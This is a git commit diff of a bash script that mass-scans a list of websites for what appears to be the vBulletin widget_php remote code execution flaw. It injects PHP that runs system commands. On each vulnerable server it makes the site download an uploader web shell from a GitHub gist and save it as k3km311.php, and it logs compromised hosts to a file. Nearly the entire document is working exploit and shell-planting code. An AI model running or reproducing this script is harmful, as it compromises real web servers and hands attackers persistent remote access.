5eb7287c0579703070cb5f92accedb37013b7491
hax0r <39062772+widhisec@users.noreply.github.com>
2019-10-03 03:50:54 +0700

    Add files via upload

--- bullet.sh
+++ bullet.sh
@@ -23,24 +23,21 @@ function bababa(){
 #en=$(echo $x | sed -f urlencode)
 #  chekweb=$(curl -s "http://tools.seobook.com/server-header-checker/?url=$en&useragent=8&protocol=11" |  grep -c "HTTP/1.1 200 OK")
     shellname=k3km311.php
-                    gase=$(curl -m 5 -kLs "${x}" --data "routestring=ajax/render/widget_php&widgetConfig[code]=echo shell_exec('echo wiwi');")
-             #grab=$(echo "$gase"| sed 's/\\r//g' | 
-                #sed 's/\\t//g' | 
-                     #   sed 's/\\n//g' | 
-                     #       sed 's/\\//g' | 
+                    gase=$(curl -m 5 -kLs "${x}" --data "routestring=ajax/render/widget_php&widgetConfig[code]=echo system('pwd')")
+             grab=$(echo "$gase"| sed 's/\\r//g' | 
+                sed 's/\\t//g' | 
+                        sed 's/\\n//g' | 
+                            sed 's/\\//g'|grep 'class="widget-content">') 
                      #               grep -Po 'class="widget-header-divider" />\K.*?<' | 
                     #tr -d '<')
-                    gassx=$(curl -m 5 -kLs "${x}" --request POST --data "routestring=ajax/render/widget_php&widgetConfig[code]=echo shell_exec("curl https://gist.githubusercontent.com/widhisec/98a2d7e5c36d6ad88df14dd6ec08da05/raw/3a71897f3e6967dcc50ad98edff37664883d0e73/uploader.php -o "$shellname""); exit;" --output /dev/null -w "%{http_code}")
-            if [[ $gase == "wiwi" ]]; then
-                  printf "[OK]\n"
-            elif [[ $gassx =~ "500" ]]; then
+                    gassx=$(curl -m 5 -kLs "${x}" --request POST --data "routestring=ajax/render/widget_php&widgetConfig[code]=$ch = curl_init(); curl_setopt($ch, CURLOPT_URL, "https://gist.githubusercontent.com/widhisec/98a2d7e5c36d6ad88df14dd6ec08da05/raw/3a71897f3e6967dcc50ad98edff37664883d0e73/uploader.php"); curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false); curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); $ajg = curl_exec($ch);$f=fopen("$shellname", "a+");fwrite($f, $ajg);fclose($f);exit;" --output /dev/null -w "%{http_code}")
+                 if [[ $gassx =~ "500" || $grab =~ "public_html" ]]; then            
                   printf "${WHITE}[VULN] ~ ${GREEN}$x\n"
                   printf "$x\n" >>  VULNS.txt
             else
                   printf "${WHITE}[NOTT VULN] ~ ${RED}$x \n"
               fi
-          
-
+rm -rf "k3km311.php); exit;"
 }
 banner
 echo -ne ${NORMAL}"list > "; read lst
@@ -54,4 +51,6 @@ for x in $(cat $lst); do
      bababa "$x" "$lst" &
 done
 wait
-echo -e "${WHITE}total vuln : "$(wc -l VULNS.txt)
+if [[ ! -f $(cat VULNS.txt) ]]; then
+  echo -e "${WHITE}total vuln : "$(wc -l VULNS.txt)
+fi
